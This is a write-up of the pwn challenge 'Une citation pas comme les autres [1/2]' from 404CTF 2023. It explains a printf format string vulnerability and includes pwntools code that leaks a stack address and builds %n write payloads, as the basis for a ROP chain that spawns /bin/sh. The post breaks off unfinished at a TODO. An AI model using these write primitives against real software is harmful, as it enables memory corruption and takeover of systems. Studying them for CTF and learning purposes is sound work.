---
layout: post
title: 404CTF 2023 | Une citation pas comme les autres [1/2]
image: /assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/cover.png
date: 2023-06-08 16:26:00
categories: [404ctf, pwn]
---

This challenge was part of the [404CTF 2023](https://www.404ctf.fr/), organized by the General Directorate for External Security (DGSE) and Télécom SudParis.

# Challenge Description

![Challenge Description]({{site.baseurl}}/assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/description.png)

When I did the challenge, the comment about `/bin` not being mounted wasn't present on the description. You will discover in this writeup why it has been added. This method is probably more difficult than the intended method, but it is what it is ¯\\\_(ツ)\_/¯

![checksec output]({{site.baseurl}}/assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/checksec.png)

# Reverse engineering

In the `main` function, we have the choice between 3 functions :
- `count_quotes` : Nothing interesting here
- `pick_quote` : This function picks a random quote in a file called `citations.txt` and prints it. Citations are delimited with `'%'`. This function is very useful and could have saved me hours but why choose the easiest way ? :)
- `write_quote` : We are asked some input, and this input is then printed. We can notice here a **Format String Vulnerability**, as we control the string passed to `printf`.

![Ghidra decompiled write_quote function]({{site.baseurl}}/assets/images/404ctf/la-feuille-blanche/write_quote.png)

# Exploitation

> A **Format String Vulnerability** happens when the user controls the parameter used to format a string. The most common example is in C, with the first argument of `printf`.
> 
> An attacker could inject format specifiers in order to read memory content. This happens because when calling a function, if there is a lot of arguments they will be passed through the stack. Take a look at [this video](https://youtu.be/0WvrSfcdq1I) from the great LiveOverflow for an introduction to this vulnerability.

With `printf`, a *Format String Vulnerability* can be used to leak content of the memory, using `'%x'` or `'%p'`, but also to **write** data thanks to the `'%n'` format specifier and a bit of tweaking.

The first plan was to leak an address of the stack to compute the return address of `write_quote`, and then write a ROP chain to execute an **execve** syscall and execute `/bin/sh`.

> It would be cleaner to use the return address of the main function instead, but as it is exiting and never returning we cannot do it.
>  
> The ROP chain can be written with several calls to `write_quote`, but it should be written from bottom to top because as soon as the return address is overwritten, the ROP chain will be executed.

The leak is straightforward, as the first address was on the stack :

```py
#!/usr/bin/python3
from pwn import *

REMOTE = False
if REMOTE:
        p = remote('challenges.404ctf.fr', 31719)
else:
        p = process('./une_citation_pas_comme_les_autres_1_2')
        input('Waiting...') # Used to attach gdb to the process

p.recvuntil(b'>>> ')
p.send(b'2\n')
p.recvuntil(b'[Vous] : ')
p.send(b'%p\n')
p.recvuntil(b' : ')
addr = int(p.recvuntil(b'\n').rstrip(b'\n'), 16)

print(f"Leaked addr {hex(addr)}")
targetAddr = addr + 0x5a8
print(f"Target addr {hex(targetAddr)}")
```

Then I wanted to ensure that our write primitive is stable and simple to use, so I wanted to write a function to automate the process of writing some data at a given address. 

The `'%n'` format specifier writes the number of characters printed so far at the addess passed as argument. But if we put an address in our payload, it means that we will have some **null** character, and `printf` will stop at the first `'\0'` encountered.

> For this reason, a payload where the address is before the `'%n'` won't work !

We will then have to put our address at the end of the payload. Such payload will have the following structure :
- Padding `'%c'` to shift parameter counter until the place where the address is
- `'%Nx'` where `N` will control the value that we want to write
- Padding `'_'` for alignment and to ensure that the address is at a fixed position
- The wanted address, little-endian

```py
def write_rop(offset, val):
        p.recvuntil(b'>>> ')
        p.send(b'2\n')
        p.recvuntil(b'[Vous] : ')
        val = str(val-178) # 178 is the number of characters printed 
        payload = (b'%c '*12 + b'%.' + val.encode() + b'f%n').ljust(56, b'_')
        payload += p64(targetAddr+offset)
        print(f'Sending {payload}')
        p.send(payload + b'\n')
```

It took me a while to figure out how to do it, but I managed it with a bit of gadget gymnastic.

Another issue is that there was a timeout on the server side, and 

// TODO (yes I know I didn't even finished the sentence...)
